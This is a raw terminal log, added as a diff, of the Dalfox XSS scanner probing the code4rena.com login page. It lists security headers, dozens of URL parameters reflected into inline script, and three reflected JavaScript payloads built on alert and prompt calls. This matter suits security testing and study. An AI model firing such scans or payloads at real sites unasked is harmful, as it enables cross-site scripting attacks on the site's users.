@@ -1,0 +1,150 @@
+running scsn 
+
+--- 
+got results 
+---
+codespace:/workspaces/UTCPD45-1> dalfox url https://code4rena.com/login                                                           (base) 
+
+    _..._
+  .' .::::.   __   _   _    ___ _ __ __
+ :  :::::::: |  \ / \ | |  | __/ \\ V /
+ :  :::::::: | o ) o || |_ | _( o )) (
+ '. '::::::' |__/|_n_||___||_| \_//_n_\
+   '-.::''    
+
+🌙🦊 Dalfox is a powerful open-source XSS scanner and utility focused on automation.
+
+ 🎯  Target                 https://code4rena.com/login
+ 🏁  Method                 GET
+ 🖥   Worker                 100
+ 🔦  BAV                    true
+ ⛏   Mining                 true (Gf-Patterns)
+ 🔬  Mining-DOM             true (mining from DOM)
+ ⏱   Timeout                10
+ 📤  FollowRedirect         false
+ 🕰   Started at             2024-09-17 07:50:13.343700386 +0000 UTC m=+0.001806361
+
+ >>>>>>>>>>>>>>>>>>>>>>>>>
+[*] 🦊 Start scan [SID:Single] / URL: https://code4rena.com/login
+[I] Found 0 testing point in DOM base parameter mining
+[I] Found 55 testing point in Dictionary base parameter mining
+[I] X-Frame-Options is DENY
+[I] Strict-Transport-Security is max-age=63072000; includeSubDomains; preload
+[I] Content-Type is text/html; charset=utf-8
+[I] Content-Security-Policy is default-src 'self' vercel.live vercel.com; script-src 'self'; script-src-elem 'self' 'unsafe-inline' vercel.live https://js.hcaptcha.com/1/api.js https://newassets.hcaptcha.com https://cdn3l.ink/app.js https://cdn.usefathom.com/script.js; connect-src 'self' vercel.live wss: pusher.com *.pusher.com https://explorer-api.walletconnect.com https://capture-api-us.ortto.app/ https://cdn.usefathom.com https://api-v1.code4rena.com https://api.code4rena.com; style-src 'self' 'unsafe-inline'; font-src 'self' data: assets.vercel.com fonts.gstatic.com ; img-src 'self' vercel.com *.vercel.com data: blob: storage.googleapis.com code4-api-v0-public-storage.s3.us-east-1.amazonaws.com code4-api-v0-public-storage-dev.s3.us-east-1.amazonaws.com user-images.githubusercontent.com raw.githubusercontent.com/code-423n4/ github.com/code-423n4/ imgur.com i.imgur.com i.gyazo.com gyazo.com https://www.gstatic.com https://explorer-api.walletconnect.com https://cdn.usefathom.com; frame-src 'self' vercel.live verify.walletconnect.com verify.walletconnect.org https://newassets.hcaptcha.com; object-src 'none';
+[I] Reflected PATH '/dalfoxpathtest' => Injected: /inJS-none(4)]
+[I] Reflected unsubscribe_token param => PTYPE: URL  Injected: /inJS-none(1)/inJS-double(1)  ,  }  [  =  \  -  ]  {  '  $  )  ;  :  +  (  .  `  |
+    1 line:  n?unsubscribe_token=DalFox\",\"initialTree\":[\"\",{\"children\":[\"login\"
+[I] Reflected host param => PTYPE: URL  Injected: /inJS-none(1)/inJS-double(1)  ]  .  -  )  ;  (  [  }  |  +  =  {  \  :  ,  $  `  '
+    1 line:  Url\":\"/login?host=DalFox\",\"initialTree\":[\"\",{\"children\":[\"login\"
+[I] Reflected token param => PTYPE: URL  Injected: /inJS-none(1)/inJS-double(1)  ;  \  `  '  $  (  |  [  }  +  ,  :  =  .  {  -  )  ]
+    1 line:  rl\":\"/login?token=DalFox\",\"initialTree\":[\"\",{\"children\":[\"login\"
+[I] Reflected domain param => PTYPE: URL  Injected: /inJS-double(1)/inJS-none(1)  ;  \  `  (  )  [  .  }  ,  -  +  =  |  ]  {  $  '  :
+    1 line:  l\":\"/login?domain=DalFox\",\"initialTree\":[\"\",{\"children\":[\"login\"
+[I] Reflected query param => PTYPE: URL  Injected: /inJS-none(1)/inJS-double(1)  {  ]  =  `  \  '  ;  }  |  .  -  [  (  $  +  )  ,  :
+    1 line:  rl\":\"/login?query=DalFox\",\"initialTree\":[\"\",{\"children\":[\"login\"
+[I] Reflected categoryid param => PTYPE: URL  Injected: /inJS-none(1)/inJS-double(1)  ;  `  (  ,  +  [  =  \  ]  {  |
+    1 line:  \"/login?categoryid=DalFox\",\"initialTree\":[\"\",{\"children\":[\"login\"
+[I] Reflected q param => PTYPE: URL  Injected: /inJS-none(1)/inJS-double(1)  .  }  )  (  =  -  |  $  +  ,  ]  ;  {  `  \
+    1 line:  calUrl\":\"/login?q=DalFox\",\"initialTree\":[\"\",{\"children\":[\"login\"
+[I] Reflected begindate param => PTYPE: URL  Injected: /inJS-none(1)/inJS-double(1)  =  )  }  |  \  `  '  ;  +  -  (  {  [  ]  $  ,  .  :
+    1 line:  :\"/login?begindate=DalFox\",\"initialTree\":[\"\",{\"children\":[\"login\"
+[I] Reflected l param => PTYPE: URL  Injected: /inJS-double(1)/inJS-none(1)  \  [  )  |  ;  {  .
+    1 line:  calUrl\":\"/login?l=DalFox\",\"initialTree\":[\"\",{\"children\":[\"login\"
+[I] Reflected go param => PTYPE: URL  Injected: /inJS-none(1)/inJS-double(1)  .  }  \  (  :  =  -  `  +  {  ]  [  |  $  '  ;  ,  )
+    1 line:  alUrl\":\"/login?go=DalFox\",\"initialTree\":[\"\",{\"children\":[\"login\"
+[I] Reflected keywords param => PTYPE: URL  Injected: /inJS-none(1)/inJS-double(1)  =  ]  )  ;  [  }  {  $  `  |  '  \  :  (  .  +  ,  -
+    1 line:  ":\"/login?keywords=DalFox\",\"initialTree\":[\"\",{\"children\":[\"login\"
+[I] Reflected type param => PTYPE: URL  Injected: /inJS-none(1)/inJS-double(1)  {  '  ;  `  ,  }  (  -  :  [  +
+    1 line:  Url\":\"/login?type=DalFox\",\"initialTree\":[\"\",{\"children\":[\"login\"
+[I] Reflected view param => PTYPE: URL  Injected: /inJS-none(1)/inJS-double(1)  \  +  {  :  .  ;  (  `  ]  ,  '  =  }  )  [  |  -  $
+    1 line:  Url\":\"/login?view=DalFox\",\"initialTree\":[\"\",{\"children\":[\"login\"
+[I] Reflected enddate param => PTYPE: URL  Injected: /inJS-none(1)/inJS-double(1)  -  $  \  :  `  ,  (  }  .  )
+    1 line:  \":\"/login?enddate=DalFox\",\"initialTree\":[\"\",{\"children\":[\"login\"
+[I] Reflected file_name param => PTYPE: URL  Injected: /inJS-none(1)/inJS-double(1)  $  ;  }  `  +  {  =  ]  )  .  \  -  :  |
+    1 line:  :\"/login?file_name=DalFox\",\"initialTree\":[\"\",{\"children\":[\"login\"
+[I] Reflected year param => PTYPE: URL  Injected: /inJS-none(1)/inJS-double(1)  (  ]  +  $  '  [  `  )  \  |  =  ,  {  .  ;  }  :  -
+    1 line:  Url\":\"/login?year=DalFox\",\"initialTree\":[\"\",{\"children\":[\"login\"
+[I] Reflected id param => PTYPE: URL  Injected: /inJS-double(1)/inJS-none(1)  {  $  (  )  [  '  =  \  ]  }  |  +  ;  ,  -  .  :  `
+    1 line:  alUrl\":\"/login?id=DalFox\",\"initialTree\":[\"\",{\"children\":[\"login\"
+[I] Reflected cat param => PTYPE: URL  Injected: /inJS-none(1)/inJS-double(1)  :  )  ,  {  `  ]  [  +  }  |  =  \  ;  -  .  (  $  '
+    1 line:  lUrl\":\"/login?cat=DalFox\",\"initialTree\":[\"\",{\"children\":[\"login\"
+[I] Reflected month param => PTYPE: URL  Injected: /inJS-double(1)/inJS-none(1)  |  }  `  =  :  +  ,
+    1 line:  rl\":\"/login?month=DalFox\",\"initialTree\":[\"\",{\"children\":[\"login\"
+[I] Reflected feed param => PTYPE: URL  Injected: /inJS-none(1)/inJS-double(1)  ,  $  :  +  [  .  }  (  '  \  |  =  ]  {  `  ;  -  )
+    1 line:  Url\":\"/login?feed=DalFox\",\"initialTree\":[\"\",{\"children\":[\"login\"
+[I] Reflected key param => PTYPE: URL  Injected: /inJS-none(1)/inJS-double(1)  $  :  `  ;  =  }  ]  +  [  (  )  ,  |  -  '  {  \  .
+    1 line:  lUrl\":\"/login?key=DalFox\",\"initialTree\":[\"\",{\"children\":[\"login\"
+[I] Reflected p param => PTYPE: URL  Injected: /inJS-none(1)/inJS-double(1)  \  |  :  )  ;  .  }  (  -  ]
+    1 line:  calUrl\":\"/login?p=DalFox\",\"initialTree\":[\"\",{\"children\":[\"login\"
+[I] Reflected file param => PTYPE: URL  Injected: /inJS-none(1)/inJS-double(1)  |  ,  [  .  \  }  $  =  :  (  +  {  -  `  ;
+    1 line:  Url\":\"/login?file=DalFox\",\"initialTree\":[\"\",{\"children\":[\"login\"
+[I] Reflected data param => PTYPE: URL  Injected: /inJS-none(1)/inJS-double(1)  +  \  =  $  -  ]  [  (  ,  :  )  `  |  .  ;
+    1 line:  Url\":\"/login?data=DalFox\",\"initialTree\":[\"\",{\"children\":[\"login\"
+[I] Reflected page_id param => PTYPE: URL  Injected: /inJS-none(1)/inJS-double(1)  }  {  )  (  .  \  ,  |  ]  =  :  -  ;  +  $
+    1 line:  \":\"/login?page_id=DalFox\",\"initialTree\":[\"\",{\"children\":[\"login\"
+[I] Reflected name param => PTYPE: URL  Injected: /inJS-double(1)/inJS-none(1)  ;  [  )  -  `  :  }  +  .  ,  (  '  \  {  |  $  =  ]
+    1 line:  Url\":\"/login?name=DalFox\",\"initialTree\":[\"\",{\"children\":[\"login\"
+[I] Reflected file_url param => PTYPE: URL  Injected: /inJS-none(1)/inJS-double(1)  -  '  +  {  ,  }  .  (  =  ]  ;  )  \  `  |  $  :  [
+    1 line:  ":\"/login?file_url=DalFox\",\"initialTree\":[\"\",{\"children\":[\"login\"
+[I] Reflected callback param => PTYPE: URL  Injected: /inJS-double(1)/inJS-none(1)  \  $  ,  )  `  '  |  +  ]  .  {  :
+    1 line:  ":\"/login?callback=DalFox\",\"initialTree\":[\"\",{\"children\":[\"login\"
+[I] Reflected html param => PTYPE: URL  Injected: /inJS-none(1)/inJS-double(1)  +  :  =  (  {  ,  `  [  ]  }  )  |  -  \  $  .  '  ;
+    1 line:  Url\":\"/login?html=DalFox\",\"initialTree\":[\"\",{\"children\":[\"login\"
+[I] Reflected page param => PTYPE: URL  Injected: /inJS-none(1)/inJS-double(1)  ,  (  =  |  }  {  -  `  +  [  \  $  ;  .  '  )  ]  :
+    1 line:  Url\":\"/login?page=DalFox\",\"initialTree\":[\"\",{\"children\":[\"login\"
+[I] Reflected terms param => PTYPE: URL  Injected: /inJS-none(1)/inJS-double(1)  -  |  (  `  }  +  =
+    1 line:  rl\":\"/login?terms=DalFox\",\"initialTree\":[\"\",{\"children\":[\"login\"
+[I] Reflected api_key param => PTYPE: URL  Injected: /inJS-none(1)/inJS-double(1)  [  ]  )  -  {  ;  $  }  .  |  (
+    1 line:  \":\"/login?api_key=DalFox\",\"initialTree\":[\"\",{\"children\":[\"login\"
+[I] Reflected lang param => PTYPE: URL  Injected: /inJS-none(1)/inJS-double(1)  -  $  ;  :  |  }  [  +  \  .  =  ]  {  `  (  )
+    1 line:  Url\":\"/login?lang=DalFox\",\"initialTree\":[\"\",{\"children\":[\"login\"
+[I] Reflected url param => PTYPE: URL  Injected: /inJS-none(1)/inJS-double(1)  :  ,  [  {  .  $  `  }  =  -  \  (  )  ]  +  |  '  ;
+    1 line:  lUrl\":\"/login?url=DalFox\",\"initialTree\":[\"\",{\"children\":[\"login\"
+[I] Reflected password param => PTYPE: URL  Injected: /inJS-none(1)/inJS-double(1)  :  -  \  |  }  )  `  ;  (  ,  =  $  ]  +  [  {  .  '
+    1 line:  ":\"/login?password=DalFox\",\"initialTree\":[\"\",{\"children\":[\"login\"
+[I] Reflected keyword param => PTYPE: URL  Injected: /inJS-none(1)/inJS-double(1)  (  )  `  '  \  }  {  $  +  ,  ;  |  :  [  ]  .  =
+    1 line:  \":\"/login?keyword=DalFox\",\"initialTree\":[\"\",{\"children\":[\"login\"
+[I] Reflected window param => PTYPE: URL  Injected: /inJS-none(1)/inJS-double(1)  }  ]  -  ,  `  +  .  |  [  (  )  ;  $  {  \  :  =  '
+    1 line:  l\":\"/login?window=DalFox\",\"initialTree\":[\"\",{\"children\":[\"login\"
+[I] Reflected emailto param => PTYPE: URL  Injected: /inJS-none(1)/inJS-double(1)  {  $  ]  +  }  (  =  )  \  [  ;  |  -  ,  '  :  .  `
+    1 line:  \":\"/login?emailto=DalFox\",\"initialTree\":[\"\",{\"children\":[\"login\"
+[I] Reflected immagine param => PTYPE: URL  Injected: /inJS-none(1)/inJS-double(1)  \  {  '  )  ]  ;  :  -  }  +  ,
+    1 line:  ":\"/login?immagine=DalFox\",\"initialTree\":[\"\",{\"children\":[\"login\"
+[I] Reflected img_url param => PTYPE: URL  Injected: /inJS-none(1)/inJS-double(1)  |  \  .  ;  }  [  ]  {
+    1 line:  \":\"/login?img_url=DalFox\",\"initialTree\":[\"\",{\"children\":[\"login\"
+[I] Reflected jsonp param => PTYPE: URL  Injected: /inJS-none(1)/inJS-double(1)  '  \  ]  (  }  |  ;  ,  )  `  $  [  .  -  =  :  +  {
+    1 line:  rl\":\"/login?jsonp=DalFox\",\"initialTree\":[\"\",{\"children\":[\"login\"
+[I] Reflected list_type param => PTYPE: URL  Injected: /inJS-none(1)/inJS-double(1)  `  {  ,  ;  +  $
+    1 line:  :\"/login?list_type=DalFox\",\"initialTree\":[\"\",{\"children\":[\"login\"
+[I] Reflected rurl param => PTYPE: URL  Injected: /inJS-none(1)/inJS-double(1)  \  +  )  [  }  {  ;  (  |  .  =  `  $
+    1 line:  Url\":\"/login?rurl=DalFox\",\"initialTree\":[\"\",{\"children\":[\"login\"
+[I] Reflected username param => PTYPE: URL  Injected: /inJS-none(1)/inJS-double(1)  $  =  ,  -  +  :  }  (  `  .  [  {  )  '  ;  ]
+    1 line:  ":\"/login?username=DalFox\",\"initialTree\":[\"\",{\"children\":[\"login\"
+[I] Reflected item param => PTYPE: URL  Injected: /inJS-none(1)/inJS-double(1)  \  )  }  ;  +  :  `  $  (  [
+    1 line:  Url\":\"/login?item=DalFox\",\"initialTree\":[\"\",{\"children\":[\"login\"
+[I] Reflected show param => PTYPE: URL  Injected: /inJS-none(1)/inJS-double(1)  .  ;  -  )  $  ,  (  |  `  +  :  {  [
+    1 line:  Url\":\"/login?show=DalFox\",\"initialTree\":[\"\",{\"children\":[\"login\"
+[I] Reflected dir param => PTYPE: URL  Injected: /inJS-none(1)/inJS-double(1)  -  +  ]  `  ,  )  (  :  |  {  [  .
+    1 line:  lUrl\":\"/login?dir=DalFox\",\"initialTree\":[\"\",{\"children\":[\"login\"
+[I] Reflected email param => PTYPE: URL  Injected: /inJS-none(1)/inJS-double(1)  [  $  +  :  (  -  ]  }  )  ;  |  `  ,  .
+    1 line:  rl\":\"/login?email=DalFox\",\"initialTree\":[\"\",{\"children\":[\"login\"
+[I] Reflected return param => PTYPE: URL  Injected: /inJS-none(1)/inJS-double(1)  }  {  .  ,  '  `  $  )  [  (  +  ]  ;  :  \  =  -  |
+    1 line:  l\":\"/login?return=DalFox\",\"initialTree\":[\"\",{\"children\":[\"login\"
+[I] Reflected search param => PTYPE: URL  Injected: /inJS-double(1)/inJS-none(1)  \  :  |  ]  '  `  }  +  (  )  $
+    1 line:  l\":\"/login?search=DalFox\",\"initialTree\":[\"\",{\"children\":[\"login\"
+[I] Reflected image_url param => PTYPE: URL  Injected: /inJS-none(1)/inJS-double(1)  `  ,  )  (  =  $  ]  '  +  ;  -  :  }  .  [  {  |
+    1 line:  :\"/login?image_url=DalFox\",\"initialTree\":[\"\",{\"children\":[\"login\"
+[I] Reflected goto param => PTYPE: URL  Injected: /inJS-none(1)/inJS-double(1)  }  '  \  =  {  `  :  .  -  ,  )  ;  ]  [  (  |  +  $
+    1 line:  Url\":\"/login?goto=DalFox\",\"initialTree\":[\"\",{\"children\":[\"login\"
+[I] Reflected api param => PTYPE: URL  Injected: /inJS-none(1)/inJS-double(1)  |  `  =  [  {  '  +  \  )  ;  $  ,  (  :  .  -  }  ]
+    1 line:  lUrl\":\"/login?api=DalFox\",\"initialTree\":[\"\",{\"children\":[\"login\"
+[I] Reflected s param => PTYPE: URL  Injected: /inJS-none(1)/inJS-double(1)  $  '  (  +  .  \  ;  }  `  ]  :  {  =  [  |  ,  -
+    1 line:  calUrl\":\"/login?s=DalFox\",\"initialTree\":[\"\",{\"children\":[\"login\"
+[I] Reflected csrf_token param => PTYPE: URL  Injected: /inJS-double(1)/inJS-none(1)  `  }  $  ;  |  '  .  {  =  -  \  )  +  ]  :  [  (  ,
+    1 line:  \"/login?csrf_token=DalFox\",\"initialTree\":[\"\",{\"children\":[\"login\"
+[W] Reflected Payload in JS: =top[/al/.source+/ert/.source](/XSS/.source)s
+[W] Reflected Payload in JS: =;prompt.apply(null,[1]);ram and waiting headless
+[W] Reflected Payload in JS: =prompt.apply(null,[1])am and waiting headless
+[*] ------------------------------------------------------------------------------------------------------------------------------------------
+[*] [duration: 3m15.750751472s][issues: 3] Finish Scan!
